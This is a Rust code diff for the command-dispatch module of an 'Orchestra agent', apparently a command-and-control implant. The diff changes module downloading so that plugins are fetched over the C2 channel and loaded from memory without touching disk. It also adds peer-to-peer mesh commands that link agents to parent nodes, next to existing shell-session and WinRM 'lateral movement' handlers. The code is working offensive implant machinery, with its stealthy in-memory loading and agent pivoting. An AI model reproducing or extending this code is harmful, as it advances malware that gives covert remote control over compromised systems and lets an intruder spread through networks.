@@ -1,5 +1,15 @@
+//! Command dispatch and handler registry for the Orchestra agent.
+//!
+//! This module implements the central command-processing loop. Each variant of
+//! [`Command`] is dispatched to the appropriate handler function. It also
+//! manages shared mutable state for long-running operations:
+//!
+//! - **Pending module requests**: Tracks in-flight plugin load operations.
+//! - **Shell sessions**: Manages interactive shell session lifetimes.
+//! - **Loaded plugins**: Registry of dynamically loaded plugin modules.
+
 use base64::Engine;
-use common::{config::Config, AuditEvent, Command, CryptoSession, Outcome};
+use common::{config::Config, AuditEvent, Command, CryptoSession, Message, Outcome};
 use lazy_static::lazy_static;
 use module_loader::LoadedPlugin;
 use std::collections::HashMap;
@@ -10,6 +20,16 @@ use tokio::sync::Mutex as TokioMutex;
 use uuid::Uuid;
 
 use super::{fsops, shell};
+
+// Pending module-download requests.  When the `DownloadModule` handler
+// sends a `ModuleRequest` through the C2 channel, it inserts a oneshot
+// sender keyed by `module_id`.  When the corresponding `ModuleResponse`
+// arrives in the main loop, the oneshot is completed with the encrypted
+// blob, unblocking the handler.
+lazy_static! {
+    pub static ref PENDING_MODULE_REQUESTS: Mutex<HashMap<String, tokio::sync::oneshot::Sender<Vec<u8>>>> =
+        Mutex::new(HashMap::new());
+}
 
 /// Reject any module identifier that contains characters outside the
 /// safe alphabet. Prevents path traversal via the `DeployModule`
@@ -132,6 +152,8 @@ pub async fn handle_command(
     config: Arc<TokioMutex<Config>>,
     command: Command,
     operator_id: &str,
+    out_tx: tokio::sync::mpsc::Sender<Message>,
+    p2p_mesh: Arc<tokio::sync::Mutex<crate::p2p::P2pMesh>>,
 ) -> (Result<String, String>, Option<Vec<u8>>, AuditEvent) {
     let action = sanitize_action(&command);
 
@@ -461,59 +483,79 @@ pub async fn handle_command(
             if !is_valid_module_id(module_id) {
                 Err("Invalid module_id (allowed: [a-zA-Z0-9_-]{1,128})".to_string())
             } else {
-                let cfg = config.lock().await.clone();
-                let url = repo_url
-                    .clone()
-                    .unwrap_or_else(|| cfg.module_repo_url.clone());
-                let fetch_url = format!("{}/{}.{}", url.trim_end_matches('/'), module_id, std::env::consts::DLL_EXTENSION);
-                match reqwest::get(&fetch_url).await {
-                    Ok(resp) => {
-                        if !resp.status().is_success() {
+                let _ = repo_url; // URL no longer used — module goes through C2.
+
+                // ── C2-tunneled module download ──────────────────────
+                // Send a ModuleRequest through the outbound C2 channel
+                // and wait for the server's ModuleResponse via a oneshot.
+                let (tx, rx) = tokio::sync::oneshot::channel::<Vec<u8>>();
+                {
+                    let mut pending = PENDING_MODULE_REQUESTS.lock().unwrap();
+                    pending.insert(module_id.clone(), tx);
+                }
+
+                let req = Message::ModuleRequest {
+                    module_id: module_id.clone(),
+                };
+                if let Err(e) = out_tx.send(req).await {
+                    // Remove the pending entry since the request never went out.
+                    PENDING_MODULE_REQUESTS.lock().unwrap().remove(module_id);
+                    return (
+                        Err(format!("Failed to send ModuleRequest: {e}")),
+                        None,
+                        make_audit(&action, Outcome::Failure, &e.to_string(), operator_id),
+                    );
+                }
+
+                // Wait for the server's ModuleResponse.  The main loop
+                // completes the oneshot when it receives the response.
+                match rx.await {
+                    Ok(encrypted_blob) => {
+                        if encrypted_blob.is_empty() {
                             return (
-                                Err(format!("Download failed: HTTP {}", resp.status())),
+                                Err(format!("Module '{module_id}' not found on server")),
                                 None,
                                 make_audit(
                                     &action,
                                     Outcome::Failure,
-                                    &format!("HTTP {}", resp.status()),
+                                    "server returned empty module",
                                     operator_id,
                                 ),
                             );
                         }
-                        match resp.bytes().await {
-                            Ok(blob) => {
-                                let path = Path::new(&cfg.module_cache_dir).join(format!(
-                                    "{}.{}",
-                                    module_id,
-                                    std::env::consts::DLL_EXTENSION
-                                ));
-                                if let Err(e) = std::fs::create_dir_all(
-                                    Path::new(&cfg.module_cache_dir),
-                                ) {
-                                    return (
-                                        Err(format!("Failed to create cache dir: {e}")),
-                                        None,
-                                        make_audit(
-                                            &action,
-                                            Outcome::Failure,
-                                            &e.to_string(),
-                                            operator_id,
-                                        ),
-                                    );
-                                }
-                                match std::fs::write(&path, &blob) {
-                                    Ok(_) => Ok(format!(
-                                        "Module '{}' downloaded to {}",
-                                        module_id,
-                                        path.display()
-                                    )),
-                                    Err(e) => Err(format!("Failed to write module: {e}")),
-                                }
+
+                        // Feed the encrypted blob directly into load_plugin
+                        // (no intermediate file on disk).
+                        let cfg = config.lock().await.clone();
+                        match module_loader::load_plugin(
+                            &encrypted_blob,
+                            &crypto,
+                            cfg.module_verify_key.as_deref(),
+                        ) {
+                            Ok(plugin) => {
+                                let metadata = plugin.get_metadata().unwrap_or_else(|| {
+                                    module_loader::PluginMetadata::default_for(module_id)
+                                });
+                                let load_timestamp = std::time::SystemTime::now()
+                                    .duration_since(std::time::UNIX_EPOCH)
+                                    .unwrap_or_default()
+                                    .as_secs();
+                                LOADED_PLUGINS.lock().unwrap().insert(
+                                    module_id.clone(),
+                                    LoadedPlugin {
+                                        plugin: Arc::new(plugin),
+                                        metadata,
+                                        load_timestamp,
+                                    },
+                                );
+                                Ok(format!("Module '{module_id}' downloaded and loaded via C2"))
                             }
-                            Err(e) => Err(format!("Failed to read response body: {e}")),
+                            Err(e) => Err(format!("Module load failed: {e}")),
                         }
                     }
-                    Err(e) => Err(format!("Download request failed: {e}")),
+                    Err(_) => {
+                        Err(format!("ModuleRequest for '{module_id}' cancelled — channel closed"))
+                    }
                 }
             }
         }
@@ -637,6 +679,41 @@ pub async fn handle_command(
         }
         #[cfg(not(windows))]
         Command::WinRmExec { .. } => Err("lateral movement requires Windows".to_string()),
+
+        // ── P2P mesh management ────────────────────────────────────────
+        Command::LinkAgents { .. } => Err("P2P LinkAgents not yet implemented on agent".to_string()),
+        Command::UnlinkAgent { .. } => Err("P2P UnlinkAgent not yet implemented on agent".to_string()),
+        Command::ListTopology => Err("P2P ListTopology not yet implemented on agent".to_string()),
+
+        // ── Agent-side P2P link commands ───────────────────────────────
+        Command::LinkTo { ref parent_addr, ref transport } => {
+            let mesh_arc = p2p_mesh.clone();
+            let mut mesh_guard = mesh_arc.lock().await;
+            match mesh_guard.connect_to_parent(
+                parent_addr,
+                transport,
+                out_tx.clone(),
+                p2p_mesh.clone(),
+            ).await {
+                Ok(link_id) => Ok(format!(
+                    "connected to parent at {} via {}, link_id={:#010X}",
+                    parent_addr, transport, link_id
+                )),
+                Err(e) => Err(format!("LinkTo failed: {e}")),
+            }
+        }
+        Command::Unlink { ref link_id } => {
+            let mut mesh_guard = p2p_mesh.lock().await;
+            match mesh_guard.disconnect(*link_id).await {
+                0 => Err("no links to disconnect".to_string()),
+                n => Ok(format!("disconnected {n} link(s)")),
+            }
+        }
+        Command::ListLinks => {
+            let mesh_guard = p2p_mesh.lock().await;
+            let links = mesh_guard.list_links();
+            Ok(serde_json::to_string(&links).unwrap_or_else(|_| "[]".to_string()))
+        }
     };
 
     let (outcome, details) = match &result {
